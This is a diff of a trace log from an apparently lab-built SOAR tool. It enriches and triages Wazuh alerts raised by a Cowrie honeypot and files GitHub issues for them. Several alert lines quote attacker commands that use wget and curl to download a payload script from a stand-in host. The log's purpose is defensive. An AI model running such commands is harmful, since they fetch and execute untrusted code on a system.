@@ -1,48 +1,52 @@
-# soar-triage: enrich -> triage -> ticket trace, driven automatically by wazuh-integratord
-# Live run against the honeypot-siem lab, 2026-08-20. Source 172.19.0.1 (RFC 1918, AbuseIPDB skipped).
-# The ticket step is a no-op here because no GITHUB_TOKEN was set for this capture.
+# soar-triage: enrich -> triage -> ticket trace, driven automatically by wazuh-integratord.
+# Live, TOKEN-ENABLED run against the honeypot-siem lab, 2026-08-20. This is the run that
+# auto-filed real GitHub Issues #2-#12 (issue #1 was an earlier single-alert launcher test).
+# Source 172.19.0.1 (RFC 1918, so AbuseIPDB is classified locally and skipped, the expected
+# lab path). Measured alert-received -> ticket-filed: 0.548-1.098s per alert (11 filed),
+# the GitHub Issue API round-trip; this is the ~0.7s in docs/writeup.md and README.
+# (The earlier no-token and pre-CA-fix attempts are the debugging trail in integration/INTEGRATION.md.)
 
-2026-08-20T01:51:57.982528+00:00 [soar-triage] alert received: rule 100104 level 10 - Cowrie: SSH brute-force, 8 or more failed logins from 172.19.0.1 withi
-2026-08-20T01:51:57.982706+00:00 [soar-triage] enrich: 172.19.0.1 -> private; reputation: private IP, external lookup skipped
-2026-08-20T01:51:57.982827+00:00 [soar-triage] triage: auto-triaged (priority medium); reasoning logged to /var/ossec/logs/soar-triage-decisions.log
-2026-08-20T01:51:57.982868+00:00 [soar-triage] ticket: not filed (no GITHUB_TOKEN set, ticket not filed)
-2026-08-20T01:52:04.047522+00:00 [soar-triage] alert received: rule 100105 level 12 - Cowrie: successful login from 172.19.0.1 right after a brute-force bur
-2026-08-20T01:52:04.047650+00:00 [soar-triage] enrich: 172.19.0.1 -> private; reputation: private IP, external lookup skipped
-2026-08-20T01:52:04.047762+00:00 [soar-triage] triage: auto-confirmed (priority high); reasoning logged to /var/ossec/logs/soar-triage-decisions.log
-2026-08-20T01:52:04.047802+00:00 [soar-triage] ticket: not filed (no GITHUB_TOKEN set, ticket not filed)
-2026-08-20T01:52:04.107307+00:00 [soar-triage] alert received: rule 100105 level 12 - Cowrie: successful login from 172.19.0.1 right after a brute-force bur
-2026-08-20T01:52:04.107428+00:00 [soar-triage] enrich: 172.19.0.1 -> private; reputation: private IP, external lookup skipped
-2026-08-20T01:52:04.107536+00:00 [soar-triage] triage: auto-confirmed (priority high); reasoning logged to /var/ossec/logs/soar-triage-decisions.log
-2026-08-20T01:52:04.107575+00:00 [soar-triage] ticket: not filed (no GITHUB_TOKEN set, ticket not filed)
-2026-08-20T01:52:04.165735+00:00 [soar-triage] alert received: rule 100151 level 12 - Cowrie: recon from 172.19.0.1 after a brute-force burst (100104), like
-2026-08-20T01:52:04.165848+00:00 [soar-triage] enrich: 172.19.0.1 -> private; reputation: private IP, external lookup skipped
-2026-08-20T01:52:04.165951+00:00 [soar-triage] triage: auto-confirmed (priority high); reasoning logged to /var/ossec/logs/soar-triage-decisions.log
-2026-08-20T01:52:04.165991+00:00 [soar-triage] ticket: not filed (no GITHUB_TOKEN set, ticket not filed)
-2026-08-20T01:52:06.229157+00:00 [soar-triage] alert received: rule 100151 level 12 - Cowrie: recon from 172.19.0.1 after a brute-force burst (100104), like
-2026-08-20T01:52:06.229279+00:00 [soar-triage] enrich: 172.19.0.1 -> private; reputation: private IP, external lookup skipped
-2026-08-20T01:52:06.229389+00:00 [soar-triage] triage: auto-confirmed (priority high); reasoning logged to /var/ossec/logs/soar-triage-decisions.log
-2026-08-20T01:52:06.229431+00:00 [soar-triage] ticket: not filed (no GITHUB_TOKEN set, ticket not filed)
-2026-08-20T01:52:08.294714+00:00 [soar-triage] alert received: rule 100151 level 12 - Cowrie: recon from 172.19.0.1 after a brute-force burst (100104), like
-2026-08-20T01:52:08.294834+00:00 [soar-triage] enrich: 172.19.0.1 -> private; reputation: private IP, external lookup skipped
-2026-08-20T01:52:08.294946+00:00 [soar-triage] triage: auto-confirmed (priority high); reasoning logged to /var/ossec/logs/soar-triage-decisions.log
-2026-08-20T01:52:08.294987+00:00 [soar-triage] ticket: not filed (no GITHUB_TOKEN set, ticket not filed)
-2026-08-20T01:52:08.355742+00:00 [soar-triage] alert received: rule 100151 level 12 - Cowrie: recon from 172.19.0.1 after a brute-force burst (100104), like
-2026-08-20T01:52:08.355874+00:00 [soar-triage] enrich: 172.19.0.1 -> private; reputation: private IP, external lookup skipped
-2026-08-20T01:52:08.355988+00:00 [soar-triage] triage: auto-confirmed (priority high); reasoning logged to /var/ossec/logs/soar-triage-decisions.log
-2026-08-20T01:52:08.356029+00:00 [soar-triage] ticket: not filed (no GITHUB_TOKEN set, ticket not filed)
-2026-08-20T01:52:10.420670+00:00 [soar-triage] alert received: rule 100151 level 12 - Cowrie: recon from 172.19.0.1 after a brute-force burst (100104), like
-2026-08-20T01:52:10.420819+00:00 [soar-triage] enrich: 172.19.0.1 -> private; reputation: private IP, external lookup skipped
-2026-08-20T01:52:10.420932+00:00 [soar-triage] triage: auto-confirmed (priority high); reasoning logged to /var/ossec/logs/soar-triage-decisions.log
-2026-08-20T01:52:10.421010+00:00 [soar-triage] ticket: not filed (no GITHUB_TOKEN set, ticket not filed)
-2026-08-20T01:52:10.481388+00:00 [soar-triage] alert received: rule 100151 level 12 - Cowrie: recon from 172.19.0.1 after a brute-force burst (100104), like
-2026-08-20T01:52:10.481625+00:00 [soar-triage] enrich: 172.19.0.1 -> private; reputation: private IP, external lookup skipped
-2026-08-20T01:52:10.481830+00:00 [soar-triage] triage: auto-confirmed (priority high); reasoning logged to /var/ossec/logs/soar-triage-decisions.log
-2026-08-20T01:52:10.481918+00:00 [soar-triage] ticket: not filed (no GITHUB_TOKEN set, ticket not filed)
-2026-08-20T01:52:12.544928+00:00 [soar-triage] alert received: rule 100108 level 10 - Cowrie: remote payload download attempt: wget http://203.0.113.10/x.sh
-2026-08-20T01:52:12.545048+00:00 [soar-triage] enrich: 172.19.0.1 -> private; reputation: private IP, external lookup skipped
-2026-08-20T01:52:12.545160+00:00 [soar-triage] triage: auto-triaged (priority medium); reasoning logged to /var/ossec/logs/soar-triage-decisions.log
-2026-08-20T01:52:12.545200+00:00 [soar-triage] ticket: not filed (no GITHUB_TOKEN set, ticket not filed)
-2026-08-20T01:52:13.611521+00:00 [soar-triage] alert received: rule 100108 level 10 - Cowrie: remote payload download attempt: curl http://203.0.113.10/payl
-2026-08-20T01:52:13.611649+00:00 [soar-triage] enrich: 172.19.0.1 -> private; reputation: private IP, external lookup skipped
-2026-08-20T01:52:13.611775+00:00 [soar-triage] triage: auto-triaged (priority medium); reasoning logged to /var/ossec/logs/soar-triage-decisions.log
-2026-08-20T01:52:13.611816+00:00 [soar-triage] ticket: not filed (no GITHUB_TOKEN set, ticket not filed)
+2026-08-20T02:24:55.923911+00:00 [soar-triage] alert received: rule 100104 level 10 - Cowrie: SSH brute-force, 8 or more failed logins from 172.19.0.1 withi
+2026-08-20T02:24:55.924058+00:00 [soar-triage] enrich: 172.19.0.1 -> private; reputation: private IP, external lookup skipped
+2026-08-20T02:24:55.924183+00:00 [soar-triage] triage: auto-triaged (priority medium); reasoning logged to /var/ossec/logs/soar-triage-decisions.log
+2026-08-20T02:24:56.621916+00:00 [soar-triage] ticket: filed GitHub Issue #2 -> https://github.com/themodernhacker/soar-triage/issues/2
+2026-08-20T02:24:59.686859+00:00 [soar-triage] alert received: rule 100105 level 12 - Cowrie: successful login from 172.19.0.1 right after a brute-force bur
+2026-08-20T02:24:59.687000+00:00 [soar-triage] enrich: 172.19.0.1 -> private; reputation: private IP, external lookup skipped
+2026-08-20T02:24:59.687125+00:00 [soar-triage] triage: auto-confirmed (priority high); reasoning logged to /var/ossec/logs/soar-triage-decisions.log
+2026-08-20T02:25:00.235035+00:00 [soar-triage] ticket: filed GitHub Issue #3 -> https://github.com/themodernhacker/soar-triage/issues/3
+2026-08-20T02:25:00.295622+00:00 [soar-triage] alert received: rule 100105 level 12 - Cowrie: successful login from 172.19.0.1 right after a brute-force bur
+2026-08-20T02:25:00.295766+00:00 [soar-triage] enrich: 172.19.0.1 -> private; reputation: private IP, external lookup skipped
+2026-08-20T02:25:00.295970+00:00 [soar-triage] triage: auto-confirmed (priority high); reasoning logged to /var/ossec/logs/soar-triage-decisions.log
+2026-08-20T02:25:01.148606+00:00 [soar-triage] ticket: filed GitHub Issue #4 -> https://github.com/themodernhacker/soar-triage/issues/4
+2026-08-20T02:25:02.218982+00:00 [soar-triage] alert received: rule 100151 level 12 - Cowrie: recon from 172.19.0.1 after a brute-force burst (100104), like
+2026-08-20T02:25:02.219112+00:00 [soar-triage] enrich: 172.19.0.1 -> private; reputation: private IP, external lookup skipped
+2026-08-20T02:25:02.219227+00:00 [soar-triage] triage: auto-confirmed (priority high); reasoning logged to /var/ossec/logs/soar-triage-decisions.log
+2026-08-20T02:25:02.930642+00:00 [soar-triage] ticket: filed GitHub Issue #5 -> https://github.com/themodernhacker/soar-triage/issues/5
+2026-08-20T02:25:04.009575+00:00 [soar-triage] alert received: rule 100151 level 12 - Cowrie: recon from 172.19.0.1 after a brute-force burst (100104), like
+2026-08-20T02:25:04.009718+00:00 [soar-triage] enrich: 172.19.0.1 -> private; reputation: private IP, external lookup skipped
+2026-08-20T02:25:04.009844+00:00 [soar-triage] triage: auto-confirmed (priority high); reasoning logged to /var/ossec/logs/soar-triage-decisions.log
+2026-08-20T02:25:04.620437+00:00 [soar-triage] ticket: filed GitHub Issue #6 -> https://github.com/themodernhacker/soar-triage/issues/6
+2026-08-20T02:25:04.690482+00:00 [soar-triage] alert received: rule 100151 level 12 - Cowrie: recon from 172.19.0.1 after a brute-force burst (100104), like
+2026-08-20T02:25:04.690633+00:00 [soar-triage] enrich: 172.19.0.1 -> private; reputation: private IP, external lookup skipped
+2026-08-20T02:25:04.690819+00:00 [soar-triage] triage: auto-confirmed (priority high); reasoning logged to /var/ossec/logs/soar-triage-decisions.log
+2026-08-20T02:25:05.788439+00:00 [soar-triage] ticket: filed GitHub Issue #7 -> https://github.com/themodernhacker/soar-triage/issues/7
+2026-08-20T02:25:05.852532+00:00 [soar-triage] alert received: rule 100151 level 12 - Cowrie: recon from 172.19.0.1 after a brute-force burst (100104), like
+2026-08-20T02:25:05.852713+00:00 [soar-triage] enrich: 172.19.0.1 -> private; reputation: private IP, external lookup skipped
+2026-08-20T02:25:05.852846+00:00 [soar-triage] triage: auto-confirmed (priority high); reasoning logged to /var/ossec/logs/soar-triage-decisions.log
+2026-08-20T02:25:06.676486+00:00 [soar-triage] ticket: filed GitHub Issue #8 -> https://github.com/themodernhacker/soar-triage/issues/8
+2026-08-20T02:25:06.750914+00:00 [soar-triage] alert received: rule 100151 level 12 - Cowrie: recon from 172.19.0.1 after a brute-force burst (100104), like
+2026-08-20T02:25:06.751059+00:00 [soar-triage] enrich: 172.19.0.1 -> private; reputation: private IP, external lookup skipped
+2026-08-20T02:25:06.751179+00:00 [soar-triage] triage: auto-confirmed (priority high); reasoning logged to /var/ossec/logs/soar-triage-decisions.log
+2026-08-20T02:25:07.445556+00:00 [soar-triage] ticket: filed GitHub Issue #9 -> https://github.com/themodernhacker/soar-triage/issues/9
+2026-08-20T02:25:08.513586+00:00 [soar-triage] alert received: rule 100151 level 12 - Cowrie: recon from 172.19.0.1 after a brute-force burst (100104), like
+2026-08-20T02:25:08.513710+00:00 [soar-triage] enrich: 172.19.0.1 -> private; reputation: private IP, external lookup skipped
+2026-08-20T02:25:08.513824+00:00 [soar-triage] triage: auto-confirmed (priority high); reasoning logged to /var/ossec/logs/soar-triage-decisions.log
+2026-08-20T02:25:09.210518+00:00 [soar-triage] ticket: filed GitHub Issue #10 -> https://github.com/themodernhacker/soar-triage/issues/10
+2026-08-20T02:25:10.285264+00:00 [soar-triage] alert received: rule 100108 level 10 - Cowrie: remote payload download attempt: wget http://203.0.113.10/x.sh
+2026-08-20T02:25:10.285396+00:00 [soar-triage] enrich: 172.19.0.1 -> private; reputation: private IP, external lookup skipped
+2026-08-20T02:25:10.285511+00:00 [soar-triage] triage: auto-triaged (priority medium); reasoning logged to /var/ossec/logs/soar-triage-decisions.log
+2026-08-20T02:25:10.888633+00:00 [soar-triage] ticket: filed GitHub Issue #11 -> https://github.com/themodernhacker/soar-triage/issues/11
+2026-08-20T02:25:10.951992+00:00 [soar-triage] alert received: rule 100108 level 10 - Cowrie: remote payload download attempt: curl http://203.0.113.10/payl
+2026-08-20T02:25:10.952135+00:00 [soar-triage] enrich: 172.19.0.1 -> private; reputation: private IP, external lookup skipped
+2026-08-20T02:25:10.952269+00:00 [soar-triage] triage: auto-triaged (priority medium); reasoning logged to /var/ossec/logs/soar-triage-decisions.log
+2026-08-20T02:25:11.616385+00:00 [soar-triage] ticket: filed GitHub Issue #12 -> https://github.com/themodernhacker/soar-triage/issues/12
